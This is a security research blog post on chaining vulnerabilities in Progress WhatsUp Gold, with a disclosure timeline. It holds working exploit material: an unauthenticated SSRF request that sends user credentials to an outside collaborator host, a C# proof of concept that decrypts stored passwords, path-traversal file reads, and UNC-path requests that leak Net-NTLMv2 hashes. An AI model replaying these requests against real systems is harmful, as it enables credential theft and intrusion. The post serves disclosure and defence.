---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-06-09_chaining-vulnerabilities-to-criticality-in-progress-whatsup-gold.md
original_filename: 2022-06-09_chaining-vulnerabilities-to-criticality-in-progress-whatsup-gold.md
title: Chaining vulnerabilities to criticality in Progress WhatsUp Gold
category: documents
detected_topics:
- ssrf
- command-injection
- path-traversal
- otp
- information-disclosure
tags:
- imported
- documents
- ssrf
- command-injection
- path-traversal
- otp
- information-disclosure
language: en
raw_sha256: 6d75020c509a2b81d3374a80929debe5831fb6c466f958b00860dc0ccd643bf5
text_sha256: 11a925857c1c2bd2dd8de82eda1dcbca6153bc9ae6ea09dd2aa990ce3274f35b
ingested_at: '2026-06-28T07:32:12Z'
sensitivity: unknown
redactions_applied: true
---

# Chaining vulnerabilities to criticality in Progress WhatsUp Gold

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-06-09_chaining-vulnerabilities-to-criticality-in-progress-whatsup-gold.md
- Source Type: markdown
- Detected Topics: ssrf, command-injection, path-traversal, otp, information-disclosure
- Ingested At: 2026-06-28T07:32:12Z
- Redactions Applied: True
- Raw SHA256: `6d75020c509a2b81d3374a80929debe5831fb6c466f958b00860dc0ccd643bf5`
- Text SHA256: `11a925857c1c2bd2dd8de82eda1dcbca6153bc9ae6ea09dd2aa990ce3274f35b`


## Content

---
title: "Chaining vulnerabilities to criticality in Progress WhatsUp Gold"
url: "https://blog.assetnote.io/2022/06/09/whatsup-gold-exploit/"
final_url: "https://www.assetnote.io/resources/research/chaining-vulnerabilities-to-criticality-in-progress-whatsup-gold"
authors: ["Shubham Shah (@infosec_au)"]
programs: ["Progress (WhatsUp Gold)"]
bugs: ["SSRF", "Local File Disclosure", "Information disclosure"]
publication_date: "2022-06-09"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2573
---

[Research Notes](/resources/research)

Security Research

June 9, 2022

# Chaining vulnerabilities to criticality in Progress WhatsUp Gold

No items found.

![](https://cdn.prod.website-files.com/6422e507d5004f85d107063a/653795bb35bc995a6f921d3f_citrixbleed.svg)

Creative Commons license

## Introduction

Once in a while, you come across the perfect storm of vulnerabilities that may be assessed as a medium risk on their own, but when combined they can lead to a critical impact. In this blog post, we detail our journey in auditing a network monitoring software called WhatsUp Gold made by the software conglomerate, Progress.

As usual, our journey started with mapping out the pre-authentication attack surface where we discovered a blind SSRF that leaked encrypted credentials. From that point onwards, we chained an information leak in the product to be able to decrypt encrypted passwords.

By breaking the encryption used by this product, an attacker could use these vulnerabilities to obtain the plain text passwords of all users registered on WhatsUp gold. Once gaining access to the post-authentication environment, it was then possible to steal Net-NTLMv2 hashes and read local files.

The advisory for this issue can be found [here](https://blog.assetnote.io/2022/06/09/whatsup-gold-advisory/).

The CVEs for these issues are:

  * [CVE-2022-29845](https://nvd.nist.gov/vuln/detail/CVE-2022-29845): Local File Disclosure
  * [CVE-2022-29846](https://nvd.nist.gov/vuln/detail/CVE-2022-29846): WhatsUp Gold Serial Number Disclosure
  * [CVE-2022-29847](https://nvd.nist.gov/vuln/detail/CVE-2022-29847): Unauthenticated Server-Side Request Forgery (SSRF)
  * [CVE-2022-29848](https://nvd.nist.gov/vuln/detail/CVE-2022-29848): Authenticated Server-Side Request Forgery (SSRF)

The advisory from Progress can be found [here](https://community.progress.com/s/article/WhatsUp-Gold-Critical-Product-Alert-May-2022).

This security research was performed by [Shubham Shah](https://twitter.com/infosec_au).

## Leaking Encrypted Credentials

WhatsUp Gold is written in C#, and after obtaining the source code by decompiling the <span class="code_single-line">.dll</span> files, we noticed that they were using the fairly popular .NET MVC framework. Our initial instinct was to search for all controllers which allowed anonymous access.

When doing so, we came across <span class="code_single-line">RenderController</span> which had the decorator <span class="code_single-line">[AllowAnonymous]</span>, meaning that it can be accessed without authentication.

<span class="code_single-line">WhatsUp.UI/WhatsUp/UI/Areas/Platform/ApiControllers/Export/RenderController.cs</span> :
  
  
  [AllowAnonymous]
  public Dictionary<string, string> Put(JObject config)
  {
  try
  {
  return _appService.RenderReport(config);
  }
  catch (Exception ex)
  {
  return new Dictionary<string, string> { { "exception", ex.Message } };
  }
  }
  
  

This code takes in a JSON object and passes it directly to <span class="code_single-line">_appService.RenderReport</span>.

Following this through to <span class="code_single-line">Ipswitch.WhatsUp.Application/Ipswitch/WhatsUp/Application/Report/ReportRenderingAppService.cs</span> , we can see the following code:
  
  
  public Dictionary<string, string> RenderReport(JObject config)
  {
  Dictionary<string, string> dictionary = new Dictionary<string, string>();
  _client.BaseAddress = (string)config["baseUrl"];
  if (!_client.LoginAsync((int)config["userId"]).Wait(30000))
  {
  throw new TimeoutException("Login timed out");
  }
  
  

From the JSON object that was passed to this function, it sets <span class="code_single-line">_client.BaseAddress</span> to the JSON value of <span class="code_single-line">baseUrl</span> and then makes a function call to <span class="code_single-line">_client.LoginAsync</span> with the JSON value of <span class="code_single-line">userId</span>.

Let’s follow through to <span class="code_single-line">_client.LoginAsync</span> which is located in <span class="code_single-line">Ipswitch.WhatsUp.Application/Ipswitch/WhatsUp/Application/Report/ReportRenderingHttpClient.cs</span :
  
  
  public string BaseAddress
  {
  get
  {
  return _client.BaseAddress.ToString();
  }
  set
  {
  _client.BaseAddress = new Uri(value);
  }
  }
  
  ... omitted ...
  
  public Task<string> LoginAsync(int userId)
  {
  string userName = string.Empty;
  string encryptedPassword=***REDACTED***
  WebUserConfig.Get(userId, ref userName, ref encryptedPassword);
  string requestUri = $"Session/Login/?sUsername={userName}&sPassword=***REDACTED***;
  return _client.GetStringAsync(requestUri);
  }
  
  

This is our sink, where user details (username and encrypted password) are obtained through <span class="code_single-line">WebUserConfig.Get</span> and then a request is made to the <span class="code_single-line">baseUrl</span> we provided earlier through <span class="code_single-line">_client.GetStringAsync(requestUri)</span>.

If we put all of this together, we can construct the following HTTP request to exploit this issue:
  
  
  PUT /NmConsole/api/core/render HTTP/1.1
  Host: hacktheplanet
  Content-Length: 177
  Accept: application/json
  DNT: 1
  X-Requested-With: XMLHttpRequest
  User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36
  Origin: http://10.211.55.6:8888
  Referer: http://10.211.55.6:8888/NmConsole/
  Accept-Encoding: gzip, deflate
  Connection: close
  Content-Type: application/json
  
  {"baseUrl":"http://7v3y5a13fprvlv9urozsuq4gr7x1lq.oastify.com","userId":1,"renderType":"xml","title":"t"}
  
  

This results in the following HTTP request received in our Burp Collaborator session:

![](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/659ea49d1c787bb9e8b907f1_encrypted-whatsup-pass.png)

The <span class="code_single-line">userId</span> can be iterated through to steal the encrypted password and usernames for all users registered in the application.

## Decrypting WhatsUp Gold Encrypted Passwords

While this blind SSRF which leaks user credentials is great, we’re unable to use these encrypted passwords to directly authenticate to WhatsUp Gold.

Noticing that the format of the encrypted password wasn’t something that we were familiar with, we were confident that WhatsUp Gold was using a custom encryption routine to encrypt passwords.

We started investigating the encryption routines of WhatsUp Gold to see what was exactly required to decrypt an encrypted password.

I’d like to take a moment to explain where static analysis can really fall down when it comes to dealing with encryption algorithms.

When we first took a look at <span class="code_single-line">NmUserAuthenticator/NmUserAuthenticator/Security/WugLoginCryptographyWrapper.cs</span> we saw the following piece of code that got us very excited:
  
  
  private const string TheEncryptionKey = "neo9ej#0!kb-YqX7^$z?@Id]_!,k9%;a}br549";
  private readonly byte[] _wellKnownStaticSaltByteArray = new byte[8] { 21, 41, 227, 207, 51, 121, 84, 136 };
  
  ... omitted ...
  
  private string LoadSalt(EncryptionAndSaltType encryptionAndSaltType)
  {
  if (encryptionAndSaltType != EncryptionAndSaltType.Aes256AndDynamicSalt)
  {
  return Encoding.Default.GetString(_wellKnownStaticSaltByteArray);
  }
  return _salt;
  }
  
  

However, we were unable to decrypt the encrypted password using this salt. Something was wrong.

In order to actually understand what was going on, we used JetBrains Rider and attached to the WhatsUp Gold process to debug the application while going through the decryption routine. This was incredibly valuable as it let us determine exactly where the <span class="code_single-line">salt</span> was coming from.

We stepped through the decryption routine and discovered that we were actually hitting <span class="code_single-line">GetSaltFromRegistry</span>:

![](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/659ea49d3a141ebadbdc03af_salt-from-reg-large.png)

![](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/659ea49da7c4e5853d7b86cb_salt-from-reg-2.png)

In retrospect, this made sense due to the way the class was being initialised:
  
  
  [InjectionConstructor]
  public WugLoginCryptographyWrapper(ICryptoSupport cryptoSupport)
  : this(cryptoSupport, string.Empty)
  {
  }
  
  public WugLoginCryptographyWrapper(ICryptoSupport cryptoSupport, string salt)
  {
  _cryptoSupport = cryptoSupport;
  _salt = GetDefaultSalt(salt);
  }
  
  private static string GetDefaultSalt(string salt)
  {
  if (string.IsNullOrEmpty(salt))
  {
  salt = GetSaltFromRegistry();
  }
  return salt;
  }
  
  

The function <span class="code_single-line">GetSaltFromRegistry>/span> is being used to set the salt, despite what the static analysis suggested. <span class="code_single-line">GetSaltFromRegistry</span> pulls the serial number of the deployment from the Windows registry, per the first screenshot.

After auditing some of the <span class="code_single-line">asp</span> files also present inside the WhatsUp Gold install we came across <span class="code_single-line">/NmConsole/$Nm/Core/Page-NmPage/evalPane/evalPane.asp</span> which contained the following source code:
  
  
  <%
  var serialNum = Nm.License.getSerialNumber(), tip = getTip();
  Js.initialize();
  %>
  
  <div id="evalMsg">
  <h1><%=$.tr("Thank you for Evaluating!")%></h1>
  <p><%=Nm.License.getLicenseExpirationMessage()%></p>
  <p><%=$.tr("Your serial number is")%> <br /> <span class="strong"><%=serialNum%></span></p>
  
  

I’m not sure what happened here. They based their entire encryption algorithm on the serial number of the product, however it was possible to obtain the serial number pre-authentication through a request to <span class="code_single-line">/NmConsole/$Nm/Core/Page-NmPage/evalPane/evalPane.asp</span>.

Making a request to the path above, led to the following response:

![](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/659ea49d591c601c96404483_wu-serial-num.png)

## Making a PoC

Our goal was to create a program that would decrypt encrypted passwords back to plain text.

In order to achieve this, we wrote some C# code which imported the WhatsUp Gold libraries and directly called the decryption functions:
  
  
  using System;
  using System.Collections.Generic;
  using Core.Cryptography;
  using NmUserAuthenticator.Security;
  
  public class Program
  {
  
  private static bool DecryptStringFromString(string encryptedString, byte[] passwordBytes, string serialKey, out string decryptedString)
  {
  //byte[] saltBytes = Encoding.ASCII.GetBytes("6BYSNUGFTKY6J6W");
  WugLoginCryptographyWrapper _wugLoginCryptography =
  new WugLoginCryptographyWrapper(new CryptoSupport(), serialKey);
  bool ret = _wugLoginCryptography.ConfigureCrypto(passwordBytes);
  
  return _wugLoginCryptography.DecryptString(encryptedString, out decryptedString);
  }
  private static byte[] DecodeBinaryString(string binaryString)
  {
  List<byte> byteList = new List<byte>();
  string str = binaryString;
  char[] chArray = new char[1]{ ',' };
  foreach (string s in str.Split(chArray))
  {
  byte result;
  if (byte.TryParse(s, out result))
  byteList.Add(result);
  }
  return byteList.ToArray();
  }
  public static void Main(string[] args)
  {	
  if (args.Length == 0)
  {
  Console.WriteLine("Please provide an encryptedPassword (comma delimited str), serialKey (i.e. 6BYSNUGFTKY6J6W)");
  Console.WriteLine("Usage: waddup-gold.exe encryptedPassword serialKey");
  return;
  }
  // string password=***REDACTED***;
  string password=***REDACTED***
  string serialKey = args[1];
  byte[] passwordBytes =
  DecodeBinaryString(password);
  string decryptedString;
  bool ret2 = DecryptStringFromString(password, passwordBytes, serialKey, out decryptedString);
  Console.WriteLine(decryptedString);
  }
  }
  
  

Since we are unable to distribute the files necessary for the exploitation of this issue, building a PoC for this issue will require you to obtain the following DLL files before compiling the C# code above:

Show DLLs

Running our C# application to decrypt encrypted passwords works excellently:
  
  
  ConsoleApplication1.exe "3,0,0,0,16,0,0,0,119,40,223,161,89,252,66,245,79,122,93,17,232,169,205,233" "6BYSNUGFTKY6J6W"
  
  testing123
  
  

## Hacker voice: I’m in

![](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/659ea49e14df08be38d98577_hacker-voice.png)

### Post Auth Local File Disclosure / Net-NTLMv2 Hash Disclosure

The following code is responsible for the local file disclosure vulnerability:

<span class="code_single-line">WhatsUp.UI/WhatsUp/UI/Areas/Platform/ApiControllers/AlarmCustomizer/AlarmCustomizerController.cs</span>
  
  
  [HttpGet]
  public HttpResponseMessage Get([FromUri] string fileName)
  {
  if (string.IsNullOrWhiteSpace(fileName))
  {
  return base.Request.CreateResponse(HttpStatusCode.BadRequest, "File Name is empty");
  }
  byte[] array = _alarmCustomizerService.ReadFile(fileName);
  if (array == null)
  {
  return base.Request.CreateResponse(HttpStatusCode.NotFound, $"File {fileName} is not found");
  }
  HttpResponseMessage httpResponseMessage = new HttpResponseMessage(HttpStatusCode.OK);
  httpResponseMessage.Content = new ByteArrayContent(array);
  httpResponseMessage.Content.Headers.ContentType = new MediaTypeHeaderValue(MimeMapping.GetMimeMapping(fileName));
  return httpResponseMessage;
  }
  
  

The <span class="code_single-line">_alarmCustomizerService.ReadFile</span> function does the following:
  
  
  public byte[] ReadFile(string fileName)
  {
  string path = Path.Combine(_customAlarmsFolder, fileName);
  if (!File.Exists(path))
  {
  return null;
  }
  using FileStream fileStream = File.OpenRead(path);
  byte[] array = new byte[16384];
  using MemoryStream memoryStream = new MemoryStream();
  int count;
  while ((count = fileStream.Read(array, 0, array.Length)) > 0)
  {
  memoryStream.Write(array, 0, count);
  }
  return memoryStream.ToArray();
  }
  
  

Due to the usage of <span class="code_single-line">Path.Combine</span>, it is possible to not only read arbitrary local files through directory traversal, but to also steal Net-NTLMv2 hashes.

The following request can be used (once authenticated) to exploit this vulnerability:

Read files
  
  
  GET /NmConsole/api/core/AlarmCustomizer/Get?fileName=../../../../../../../../../../Windows/win.ini HTTP/1.1
  Host: 192.168.1.7:8888
  Accept: application/json
  DNT: 1
  X-Requested-With: XMLHttpRequest
  User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36
  Origin: http://192.168.1.7:8888
  Referer: http://192.168.1.7:8888/NmConsole/
  Accept-Encoding: gzip, deflate
  Accept-Language: en-US,en;q=0.9
  Cookie: WugFipsEnabled=0; ASPSESSIONIDCCTACCST=AOLJLPKCMMKBNOKIOKBFACIJ; ASPSESSIONIDCQCBBTRT=BKEBKGADEKJAGGKBEMFFDBNL; ASPSESSIONIDACATRADC=JCBLJMBDGMDFJJBDJOMFGEGJ; langid=1033; ASPSESSIONIDCQAQSDCA=MPFDHCCDKODEFHCENCGOFMLK; .ASPXAUTH=882C954FBCBF89F3198777583C4F2E9CE535D7619C9CA4B2BDAD14BE55BDF038447164F2480BC147167F8B117438A3AF4775985931351B2798D6C5A667AF01F441828C2AFAF55E41A26A62CC86AB3EF3BF6F02A081C4580E34DA6B1841FF614D; ASP.NET_SessionId=xi42yc4jgsrkcvqoin0ehrqw; ASPSESSIONIDASDTRDCA=HOFFHLDDMOEKIFNHMGJOPCJM
  Connection: close
  
  

Steal Net-NTLMv2 hash
  
  
  GET /NmConsole/api/core/AlarmCustomizer/Get?fileName=\\ip\C$\Windows\win.ini HTTP/1.1
  Host: 192.168.1.7:8888
  Accept: application/json
  DNT: 1
  X-Requested-With: XMLHttpRequest
  User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36
  Origin: http://192.168.1.7:8888
  Referer: http://192.168.1.7:8888/NmConsole/
  Accept-Encoding: gzip, deflate
  Accept-Language: en-US,en;q=0.9
  Cookie: WugFipsEnabled=0; ASPSESSIONIDCCTACCST=AOLJLPKCMMKBNOKIOKBFACIJ; ASPSESSIONIDCQCBBTRT=BKEBKGADEKJAGGKBEMFFDBNL; ASPSESSIONIDACATRADC=JCBLJMBDGMDFJJBDJOMFGEGJ; langid=1033; ASPSESSIONIDCQAQSDCA=MPFDHCCDKODEFHCENCGOFMLK; ASPSESSIONIDASDTRDCA=HOFFHLDDMOEKIFNHMGJOPCJM; ASP.NET_SessionId=r2ucpn4uodyuawlvwfwwc2yx; .ASPXAUTH=A139843904A132FDD58198581D8880D96684F3B6506F89D565EE6ADA89A5CBEA5936F85EB82E4645EC169DBD254B3CB5C1752AC2B868986F255235E50E0C9C9656A00DB5850BC4837B5E9DC5***REDACTED-SUSPECT-TOKEN***  Connection: close
  
  

In Responder you will see the following:
  
  
  [SMBv2] NTLMv2-SSP Client  : redacted
  [SMBv2] NTLMv2-SSP Username : SHUBS\SHUBS7A88$
  [SMBv2] NTLMv2-SSP Hash  : SHUBS7A88$::SHUBS:redacted:redacted:redacted
  
  
  
  ### Post Auth Net-NTLMv2 Hash Disclosure
  
  Now that we have the plain-text password for literally any user registered on WhatsUp Gold, we can authenticate and exploit the application further.
  
  The following request can be used to leak the Net-NTLMv2 hash of the system (post authentication):
  
  
  GET /NmConsole/api/core/WebContent/Get?id=\\d0e4ag69kvw1q1e0wu4yzw9mwd2cq1.oastify.com\C$\Windows\win.ini HTTP/1.1
  Host: 192.168.1.7:8888
  Accept: application/json
  DNT: 1
  X-Requested-With: XMLHttpRequest
  User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36
  Origin: http://192.168.1.7:8888
  Referer: http://192.168.1.7:8888/NmConsole/
  Accept-Encoding: gzip, deflate
  Accept-Language: en-US,en;q=0.9
  Cookie: WugFipsEnabled=0; ASPSESSIONIDCCTACCST=AOLJLPKCMMKBNOKIOKBFACIJ; ASPSESSIONIDCQCBBTRT=BKEBKGADEKJAGGKBEMFFDBNL; ASPSESSIONIDACATRADC=JCBLJMBDGMDFJJBDJOMFGEGJ; langid=1033; ASPSESSIONIDCQAQSDCA=MPFDHCCDKODEFHCENCGOFMLK; ASPSESSIONIDASDTRDCA=HOFFHLDDMOEKIFNHMGJOPCJM; .ASPXAUTH=1515EFF96B2A9BC68C83F2AA58392F1DEFE9DA998FCE75AC244935EC54E4217126FD8B3F54C641B5873B67CF97110FE7ADE6F0C92C31CEBCE1C2DE3390BA11625B68C3D805F73B0AB63FC1A3C13CED09930B6C635072AB18FF26AA9185BB6291; ASP.NET_SessionId=kthexfwbswlytkjrjhkii4qt
  Connection: close
  
  

This is possible due to the following code in <span class="code_single-line">WhatsUp.UI/WhatsUp/UI/Areas/Platform/ApiControllers/WebContentManager/WebContentController.cs</span>:
  
  
  [HttpGet]
  public HttpResponseMessage Get(string id)
  {
  try
  {
  string path = Path.Combine(_webContentPath, id);
  HttpResponseMessage httpResponseMessage = new HttpResponseMessage(HttpStatusCode.OK);
  FileStream content = new FileStream(path, FileMode.Open);
  httpResponseMessage.Content = new StreamContent(content);
  httpResponseMessage.Content.Headers.ContentType = new MediaTypeHeaderValue(MimeMapping.GetMimeMapping(id));
  return httpResponseMessage;
  }
  catch (Exception ex)
  {
  return HttpRequestMessageExtensions.CreateErrorResponse(((ApiController)this).get_Request(), HttpStatusCode.InternalServerError, ex);
  }
  }
  
  

This results in the following in Responder:
  
  
  [SMBv2] NTLMv2-SSP Client  : redacted
  [SMBv2] NTLMv2-SSP Username : SHUBS\SHUBS7A88$
  [SMBv2] NTLMv2-SSP Hash  : SHUBS7A88$::SHUBS:redacted:redacted:redacted
  
  

## Vendor Response

Progress dealt with these issues seriously, and we appreciated their efforts in remediating this vulnerability and corresponding with us.

We reported this issue to Progress on the 11th of April, 2022.

The timeline for this disclosure process can be found below:

  * **Apr 11th, 2022** : Disclosure of multiple vulnerabilities to Progress’s security team
  * **Apr 13th, 2022** : Progress’s team asks us to submit via the HackerOne disclosure form. We refuse as it prevents disclosure of the issue.
  * **Apr 14th, 2022** : Progress’s team asks us to provide the product version and CVSS scores. We provide this information.
  * **Apr 27th, 2022** : Progress’s team asks us to get on a call to discuss updates and questions on findings. We agree to this call.
  * **Apr 28th, 2022** : A patched version of WhatsUp Gold is provided to confirm that the issues no longer exist.
  * **May 10th, 2022** : We ask for a serial key for the version provided. Progress’s team provide us with a key.
  * **May 11th, 2022** : We confirm that all the vulnerabilities reported have been fixed.

## Remediation Advice

The remediation details provided from Progress’s advisory are satisfactory and will ensure that this vulnerabilty cannot be exploited.

The knowledge base article detailing the patches or workaround to apply can be found [here](https://community.progress.com/s/article/WhatsUp-Gold-Critical-Product-Alert-May-2022).

## Conclusion

Individually, the vulnerabilities in this blog post were not rated critical from a CVSS standpoint from the vendor, however, as we can see, when combined, they lead to a critical outcome. When auditing software for security vulnerabilities, it is important to try and chain vulnerabilities in order to achieve a greater impact.

As always, customers of our [Attack Surface Management](https://assetnote.io/) platform were the first to know when this vulnerability affected them. We continue to perform original security research in an effort to inform our customers about zero-day vulnerabilities in their attack surface.

Written by:

Shubham Shah

Your subscription could not be saved. Please try again. 

Your subscription has been successful. 

Get updates on our research

Subscribe to our newsletter and stay updated on the newest research, security advisories, and more!

Enter your email address to subscribe

Provide your email address to subscribe. For e.g abc@xyz.com 

SUBSCRIBE 

### More Like This

[Security ResearchNew!Doing the Due Diligence: Analyzing the Next.js Middleware Bypass (CVE-2025-29927)Read moreRead on ASN Blog](/resources/research/doing-the-due-diligence-analyzing-the-next-js-middleware-bypass-cve-2025-29927)

[Security ResearchNew!How an obscure PHP footgun led to RCE in Craft CMSRead moreRead on ASN Blog](/resources/research/how-an-obscure-php-footgun-led-to-rce-in-craft-cms)

[Security ResearchNew!Citrix Denial of Service: Analysis of CVE-2024-8534Read moreRead on ASN Blog](/resources/research/citrix-denial-of-service-analysis-of-cve-2024-8534)

[Security ResearchNew!Nginx/Apache Path Confusion to Auth Bypass in PAN-OS (CVE-2025-0108)Read moreRead on ASN Blog](/resources/research/nginx-apache-path-confusion-to-auth-bypass-in-pan-os)

[Security ResearchNew!Leveraging An Order of Operations Bug to Achieve RCE in Sitecore 8.x - 10.xRead moreRead on ASN Blog](/resources/research/leveraging-an-order-of-operations-bug-to-achieve-rce-in-sitecore-8-x---10-x)

[Security ResearchNew!Insecurity through Censorship: Vulnerabilities Caused by The Great FirewallRead moreRead on ASN Blog](/resources/research/insecurity-through-censorship-vulnerabilities-caused-by-the-great-firewall)

[Back to All](/resources/research)

### Ready to get started?

Get on a call with our team and learn how Assetnote can change the way you secure your attack surface. We'll set you up with a trial instance so you can see the impact for yourself.

[Request a Demo](/demo)

![](https://cdn.prod.website-files.com/6422e507d5004f85d107063a/64241df2676aeba82706ffe8_assetnote-logo.svg)

Address:  
Level 10, 12 Creek Street, Brisbane QLD, 4000  
‍  
Contact:  
[contact@assetnote.io  
  
](mailto:contact@assetnote.io)Press Inquiries:[  
](mailto:contact@assetnote.io)[press@assetnote.io](mailto:press@assetnote.io)

![](https://cdn.prod.website-files.com/6422e507d5004f85d107063a/661f041240ed96ed7a03fe6f_61dc1beb212a1202fc512a76_SOC%202-03-p-500.png)

[](https://twitter.com/assetnote)[](https://www.linkedin.com/company/assetnote/)

Platform Features

[Continuous Asset Discovery](/platform/asset-discovery)

[Deep Asset Enrichment](/platform/asset-enrichment)

[Assetnote Exposure Engine](/platform/assetnote-exposure-engine)

[Expert Security Research](/platform/expert-security-research)

[Collaborative Workflows](/platform/collaborative-workflows)

[Customization](/platform/customization)

Use Cases

[Continuous Asset Discovery and Inventory](/use-cases/continuous-asset-discovery-and-inventory)

[Real-Time Exposure Monitoring](/use-cases/continuous-security-monitoring)

[Attack Surface Reduction](/use-cases/attack-surface-reduction)

[Mergers & Acquisitions](/use-cases/mergers-and-acquisitions)

[Bug Bounty Readiness](/use-cases/bug-bounty-readiness)

© 2026 Assetnote. All rights reserved.

[Privacy Policy](https://assetnote.io/policies/privacy-policy)
